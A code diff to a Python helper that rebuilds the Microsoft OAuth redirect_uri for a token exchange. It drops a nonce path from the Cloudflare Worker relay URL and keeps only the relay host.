@@ -673,48 +673,39 @@ def resolve_token_exchange_redirect_uri(
     relay_path: str | None = None,
 ) -> str:
     """
-    Resolves the correct redirect_uri to use in the token exchange
-    POST request to Microsoft.
+    Resolves the correct redirect_uri for the token exchange POST.
 
-    Microsoft requires the redirect_uri in the token exchange to
-    exactly match the redirect_uri used in the original authorize
-    request. If the request came via the Cloudflare Worker relay,
-    the redirect_uri must be the worker URL — not the backend URL.
+    Must exactly match what was registered in Azure and used
+    in the original authorize request.
 
-    relay_host is passed by the worker as relay_host= query param.
-    relay_path is passed by the worker as relay_path= query param.
+    Since the worker redirect_uri is now a fixed base URL
+    with no nonce path, we only need relay_host to reconstruct it.
+    relay_path is ignored — the nonce path is no longer used
+    as part of the registered redirect_uri.
 
-    If relay_host is present we reconstruct the worker redirect_uri
-    from relay_host + relay_path so it matches what Microsoft saw.
-
-    If relay_host is not present we fall back to REDIRECT_URI
-    which is the direct backend callback URL.
+    If relay_host is present:
+      redirect_uri = https://{relay_host}
+    If relay_host is not present:
+      redirect_uri = REDIRECT_URI (direct backend callback)
     """
     if relay_host:
-        # Reconstruct the exact redirect_uri Microsoft redirected to
-        # relay_host = dorseym410.workers.dev
-        # relay_path = /a1b2c3d4e5f6g7h8  (the nonce path)
-        path = (relay_path or "").strip()
-        if path and not path.startswith("/"):
-            path = f"/{path}"
-        worker_redirect_uri = f"https://{relay_host}{path}"
+        # Fixed base URL — no nonce path
+        # Matches exactly what is registered in Azure
+        worker_redirect_uri = f"https://{relay_host}"
         print(
             f"[auth] resolve_token_exchange_redirect_uri\n"
             f"  source=worker_relay\n"
             f"  relay_host={relay_host}\n"
-            f"  relay_path={relay_path}\n"
             f"  resolved_redirect_uri={worker_redirect_uri}"
         )
         return worker_redirect_uri
 
-    # No relay — use direct backend callback URI
     print(
         f"[auth] resolve_token_exchange_redirect_uri\n"
         f"  source=direct\n"
         f"  resolved_redirect_uri={REDIRECT_URI}"
     )
     return REDIRECT_URI
-
 
 # =========================
 # TOKEN EXCHANGE (OAUTH CALLBACK)
